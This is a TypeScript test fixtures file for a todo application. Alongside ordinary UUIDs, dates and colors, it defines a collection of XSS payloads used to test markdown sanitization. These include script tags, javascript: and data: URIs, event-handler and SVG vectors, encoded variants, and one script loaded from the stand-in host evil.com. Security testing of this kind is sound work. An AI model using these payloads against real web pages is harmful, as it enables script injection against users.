/**
 * Test Constants and Fixtures
 *
 * Centralized test constants to eliminate duplication across test files.
 * Used by 40+ test files to ensure consistency and maintainability.
 */

/**
 * Standard UUIDs for test data
 * These UUIDs are used extensively across type tests, integration tests, and unit tests
 */
export const TEST_UUIDS = {
  TODO_1: '550e8400-e29b-41d4-a716-446655440000',
  TODO_2: '550e8400-e29b-41d4-a716-446655440001',
  TODO_3: '550e8400-e29b-41d4-a716-446655440003',
  USER_1: '550e8400-e29b-41d4-a716-446655440002',
  USER_2: '550e8400-e29b-41d4-a716-446655440004',
  LIST_1: '7c9e6679-7425-40de-944b-e07fc1f90ae7',
  LIST_2: '8d0f7780-8536-51ef-b05c-f18gd2f01bf8',
} as const;

/**
 * XSS Attack Payloads for Security Testing
 *
 * Comprehensive collection of XSS attack vectors used to verify
 * markdown sanitization and prevent script injection.
 *
 * Used extensively in:
 * - app/__tests__/security/markdown-xss.test.tsx (30+ occurrences)
 * - app/__tests__/integration/markdown-lifecycle.test.tsx (15+ occurrences)
 * - app/__tests__/components/TodoItem.markdown.test.tsx (10+ occurrences)
 */
export const XSS_PAYLOADS = {
  // Script Injection Attacks
  SCRIPT_BASIC: '<script>alert("XSS")</script>',
  SCRIPT_SINGLE_QUOTE: "<script>alert('XSS')</script>",
  SCRIPT_WITH_SRC: '<script src="http://evil.com/xss.js"></script>',
  SCRIPT_ENCODED: '&lt;script&gt;alert("XSS")&lt;/script&gt;',

  // Protocol-based Attacks
  JAVASCRIPT_PROTOCOL: 'javascript:alert("XSS")',
  JAVASCRIPT_PROTOCOL_SINGLE: "javascript:alert('XSS')",
  DATA_PROTOCOL: 'data:text/html,<script>alert("XSS")</script>',
  VBSCRIPT_PROTOCOL: 'vbscript:msgbox("XSS")',

  // Event Handler Injection
  ONERROR_IMG: '<img src="x" onerror="alert(\'XSS\')">',
  ONCLICK_DIV: '<div onclick="alert(\'XSS\')">Click me</div>',
  ONLOAD_BODY: '<body onload="alert(\'XSS\')">',
  ONMOUSEOVER_SPAN: '<span onmouseover="alert(\'XSS\')">Hover me</span>',
  ONFOCUS_LINK: '<a href="#" onfocus="alert(\'XSS\')">Focus me</a>',
  ONINPUT_INPUT: '<input type="text" oninput="alert(\'XSS\')">',

  // HTML Element Injection
  IFRAME_BASIC: '<iframe src="javascript:alert(\'XSS\')"></iframe>',
  IFRAME_SRCDOC: '<iframe srcdoc="<script>alert(\'XSS\')</script>"></iframe>',
  OBJECT_DATA: '<object data="javascript:alert(\'XSS\')"></object>',
  EMBED_SRC: '<embed src="javascript:alert(\'XSS\')">',

  // CSS-based Attacks
  STYLE_BACKGROUND_URL:
    '<div style="background: url(javascript:alert(\'XSS\'))">',
  STYLE_EXPRESSION: '<div style="width: expression(alert(\'XSS\'))">',
  STYLE_IMPORT: '<style>@import \'javascript:alert("XSS")\';</style>',

  // SVG-based Attacks
  SVG_ONLOAD: '<svg onload="alert(\'XSS\')">',
  SVG_SCRIPT: '<svg><script>alert("XSS")</script></svg>',
  SVG_ANIMATE: '<svg><animate onbegin="alert(\'XSS\')" attributeName="x"/>',

  // Link-based Attacks (Markdown specific)
  MARKDOWN_LINK_JAVASCRIPT: '[Click me](javascript:alert("XSS"))',
  MARKDOWN_LINK_DATA:
    '[Click me](data:text/html,<script>alert("XSS")</script>)',
  MARKDOWN_IMAGE_ONERROR: '![](x onerror="alert(\'XSS\')")',

  // Meta and Other Injection
  META_REFRESH:
    '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
  BASE_HREF: '<base href="javascript:alert(\'XSS\')">',
  FORM_ACTION:
    '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',

  // Encoded Attacks
  HTML_ENTITY_ENCODED:
    '&lt;img src=x onerror=&#34;alert(&#39;XSS&#39;)&#34;&gt;',
  URL_ENCODED: '%3Cscript%3Ealert(%22XSS%22)%3C/script%3E',

  // Null Byte Injection
  NULL_BYTE_SCRIPT: '<scri\x00pt>alert("XSS")</script>',

  // Case Variation Attacks
  MIXED_CASE_SCRIPT: '<ScRiPt>alert("XSS")</sCrIpT>',
  UPPERCASE_ONCLICK: '<DIV ONCLICK="alert(\'XSS\')">Click</DIV>',
} as const;

/**
 * Safe markdown test cases (should render correctly)
 */
export const SAFE_MARKDOWN = {
  BASIC_TEXT: 'Simple plain text',
  BOLD: '**Bold text**',
  ITALIC: '*Italic text*',
  CODE_INLINE: '`code block`',
  CODE_BLOCK: '```\ncode\n```',
  LINK_HTTPS: '[Safe link](https://example.com)',
  LINK_HTTP: '[HTTP link](http://example.com)',
  LIST_UNORDERED: '- Item 1\n- Item 2',
  LIST_ORDERED: '1. First\n2. Second',
  HEADING: '# Heading',
  BLOCKQUOTE: '> Quote',
  IMAGE_HTTPS: '![Alt text](https://example.com/image.png)',
} as const;

/**
 * Test dates for consistent timestamp testing
 */
export const TEST_DATES = {
  PAST_HOUR: new Date(Date.now() - 60 * 60 * 1000),
  PAST_DAY: new Date(Date.now() - 24 * 60 * 60 * 1000),
  PAST_WEEK: new Date(Date.now() - 7 * 24 * 60 * 60 * 1000),
  FUTURE_HOUR: new Date(Date.now() + 60 * 60 * 1000),
  EPOCH_2023: new Date('2023-01-01T00:00:00.000Z'),
  EPOCH_2024: new Date('2024-01-01T00:00:00.000Z'),
} as const;

/**
 * Common test colors for participant testing
 */
export const TEST_COLORS = {
  RED: '#FF5733',
  BLUE: '#3498DB',
  GREEN: '#2ECC71',
  YELLOW: '#F1C40F',
  PURPLE: '#9B59B6',
} as const;

// Simple test to satisfy Jest's requirement
describe('Test Constants', () => {
  it('should export test constants', () => {
    expect(TEST_UUIDS).toBeDefined();
    expect(XSS_PAYLOADS).toBeDefined();
    expect(SAFE_MARKDOWN).toBeDefined();
    expect(TEST_DATES).toBeDefined();
    expect(TEST_COLORS).toBeDefined();
  });
});
